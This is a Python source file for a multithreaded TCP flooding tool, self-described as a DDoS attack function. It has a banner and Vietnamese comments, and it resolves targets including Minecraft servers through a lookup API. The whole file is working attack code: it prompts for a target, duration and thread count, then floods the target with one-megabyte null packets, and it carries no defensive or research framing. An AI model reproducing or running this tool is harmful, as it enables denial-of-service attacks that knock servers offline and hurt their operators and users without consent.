import os
import subprocess
import sys
import importlib
import socket
import threading
import time
from datetime import datetime

# Required modules list - CHỈ GIỮ LẠI NHỮNG MODULE THỰC SỰ DÙNG
required_modules = [
    'requests',
    'colorama'
]

def check_and_install_module(module_name):
    """
    Check if a module is installed, install if missing
    """
    try:
        importlib.import_module(module_name)
        print('[+] Module đã được cài.')
        return True
    except ImportError:
        print('[-] Module chưa cài. Đang tiến hành cài đặt...')
        try:
            subprocess.check_call([
                sys.executable, '-m', 'pip', 'install', module_name
            ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            print('[+] Cài đặt thành công!')
            return True
        except subprocess.CalledProcessError as e:
            print(f'[!] Lỗi khi cài {module_name}: {e}')
            return False

def check_required_modules():
    """
    Check and install all required modules
    """
    all_installed = True
    for module in required_modules:
        if not check_and_install_module(module):
            all_installed = False
    return all_installed

# Check modules before proceeding
if not check_required_modules():
    print('[!] Thiếu các module bắt buộc. Vui lòng kiểm tra lại.')
    sys.exit(1)

# Import colorama sau khi đã kiểm tra
from colorama import init, Fore, Style

# Initialize colorama
init()

def clear_screen():
    """Clear terminal screen"""
    os.system('cls' if os.name == 'nt' else 'clear')

BANNER = f"""
{Fore.RED}
███████╗██╗  ██╗██╗██████╗ ██╗██████╗ ██╗
██╔════╝██║ ██╔╝██║██╔══██╗██║██╔══██╗██║
███████╗█████╔╝ ██║██████╔╝██║██║  ██║██║
╚════██║██╔═██╗ ██║██╔══██╗██║██║  ██║██║
███████║██║  ██╗██║██████╔╝██║██████╔╝██║
╚══════╝╚═╝  ╚═╝╚═╝╚═════╝ ╚═╝╚═════╝ ╚═╝
{Style.RESET_ALL}
"""

def get_server_ip(server_address):
    """
    Resolve server IP and port from address
    """
    try:
        if ':' in server_address:
            host, port = server_address.rsplit(':', 1)
            port = int(port)
            ip_address = socket.gethostbyname(host)
            print(f'{Fore.GREEN}[+] ᴇxᴛʀᴀᴄᴛᴇᴅ ɪᴘ: {ip_address}, ᴘᴏʀᴛ: {port}{Style.RESET_ALL}')
            return ip_address, port
        else:
            print(f'{Fore.YELLOW}[ɪ] ɴᴏ ᴘᴏʀᴛ ᴘʀᴏᴠɪᴅᴇᴅ, ғᴇᴛᴄʜɪɴɢ ғʀᴏᴍ ᴀᴘɪ...{Style.RESET_ALL}')
            try:
                # Import requests ở đây vì nó đã được cài đặt
                import requests
                res = requests.get(f'https://api.mcsrvstat.us/2/{server_address}', timeout=5).json()
                ip = res.get('ip') or socket.gethostbyname(server_address)
                port = int(res.get('port', 25565))
                
                if not res.get('online'):
                    print(f'{Fore.YELLOW}[-] ᴀᴘɪ ʀᴇᴘᴏʀᴛs sᴇʀᴠᴇʀ ᴏғғʟɪɴᴇ, ᴜsɪɴɢ ɪᴘ {ip}:{port}{Style.RESET_ALL}')
                else:
                    print(f'{Fore.GREEN}[+] ᴀᴘɪ ʀᴇᴛᴜʀɴᴇᴅ: ɪᴘ {ip}, ᴘᴏʀᴛ {port}{Style.RESET_ALL}')
                return ip, port
            except Exception as api_error:
                print(f'{Fore.YELLOW}[-] ᴄᴀɴɴᴏᴛ ғᴇᴛᴄʜ ɪᴘ ᴠɪᴀ ᴀᴘɪ: {api_error}, ғᴀʟʟɪɴɢ ʙᴀᴄᴋ ᴛᴏ ᴅɴs{Style.RESET_ALL}')
                ip = socket.gethostbyname(server_address)
                print(f'{Fore.GREEN}[+] ᴅɴs ғᴀʟʟʙᴀᴄᴋ: ɪᴘ {ip}, ᴘᴏʀᴛ 25565{Style.RESET_ALL}')
                return ip, 25565
    except Exception as e:
        print(f'{Fore.RED}[ᴇʀʀ] ᴇʀʀᴏʀ ᴘʀᴏᴄᴇssɪɴɢ ᴀᴅᴅʀᴇss: {e}{Style.RESET_ALL}')
        return None, None

def send_packet(server_ip, server_port, packet, packet_count, thread_id, stop_event):
    """
    Send DDoS packets to target server
    """
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(3)
            s.connect((server_ip, server_port))
            
            for i in range(packet_count):
                if stop_event.is_set():
                    break
                s.sendall(packet)
                now = datetime.now().strftime('%H:%M:%S')
                print(f'{Fore.CYAN}[{now}] ᴛʜʀᴇᴀᴅ:{thread_id} | sᴇɴᴅ ᴘᴀᴄᴋᴇᴛ: ({i+1}/{packet_count}){Style.RESET_ALL}')
    except Exception as e:
        now = datetime.now().strftime('%H:%M:%S')
        print(f'{Fore.RED}[{now}] ᴛʜʀᴇᴀᴅ:{thread_id} | ᴇʀʀᴏʀ: {e}{Style.RESET_ALL}')

def stop_after_timeout(stop_event, timeout):
    """Stop attack after timeout"""
    time.sleep(timeout)
    stop_event.set()
    print(f'\n{Fore.YELLOW}⛔ sᴛᴏᴘᴘᴇᴅ sᴇɴᴅɪɴɢ ᴀғᴛᴇʀ {timeout} sᴇᴄᴏɴᴅs{Style.RESET_ALL}')

def run_ski():
    """Main DDoS attack function"""
    clear_screen()
    print(BANNER)
    
    try:
        server_address = input(f'{Fore.YELLOW}[+]ᴛᴀʀɢᴇᴛ ɪᴘ [ɪᴘ/ᴅᴏᴍᴀɪɴ ᴏʀ ɪᴘ:ᴘᴏʀᴛ]: {Style.RESET_ALL}')
        server_ip, server_port = get_server_ip(server_address)
        
        if not server_ip:
            raise ValueError(f'{Fore.RED}ᴄᴀɴɴᴏᴛ ʀᴇsᴏʟᴠᴇ sᴇʀᴠᴇʀ ᴀᴅᴅʀᴇss{Style.RESET_ALL}')
        
        timeout = int(input(f'{Fore.YELLOW}[+]ᴀᴛᴛᴀᴄᴋ ᴅᴜʀᴀᴛɪᴏɴ (sᴇᴄᴏɴᴅs): {Style.RESET_ALL}'))
        if timeout <= 0:
            raise ValueError(f'{Fore.RED}[ᴇʀʀ] ᴀᴛᴛᴀᴄᴋ ᴅᴜʀᴀᴛɪᴏɴ ᴍᴜsᴛ ʙᴇ > 0{Style.RESET_ALL}')
        
        packet = b'\x00' * 1048576  # 1MB packet
        packet_count = 100000
        
        thread_count = int(input(f'{Fore.YELLOW}[+] ᴛʜʀᴇᴀᴅ ᴄᴏᴜɴᴛ: {Style.RESET_ALL}'))
        if thread_count <= 0:
            raise ValueError(f'{Fore.RED}[ᴇʀʀ] ᴛʜʀᴇᴀᴅ ᴄᴏᴜɴᴛ ᴍᴜsᴛ ʙᴇ > 0{Style.RESET_ALL}')
        
        print(f'{Fore.GREEN}[+] sᴛᴀʀᴛɪɴɢ ᴀᴛᴛᴀᴄᴋ ᴏɴ {server_ip}:{server_port} ᴡɪᴛʜ {thread_count} ᴛʜʀᴇᴀᴅs...{Style.RESET_ALL}')
        
        stop_event = threading.Event()
        timer_thread = threading.Thread(target=stop_after_timeout, args=(stop_event, timeout))
        timer_thread.start()
        
        threads = []
        for i in range(thread_count):
            t = threading.Thread(
                target=send_packet,
                args=(server_ip, server_port, packet, packet_count, i + 1, stop_event)
            )
            threads.append(t)
            t.start()
        
        for t in threads:
            t.join()
        
        print(f'{Fore.GREEN}[+] ᴀᴛᴛᴀᴄᴋ ᴄᴏᴍᴘʟᴇᴛᴇᴅ ✅{Style.RESET_ALL}')
    except Exception as e:
        print(f'{Fore.RED}ᴇʀʀᴏʀ: {e}{Style.RESET_ALL}')

if __name__ == "__main__":
    run_ski()
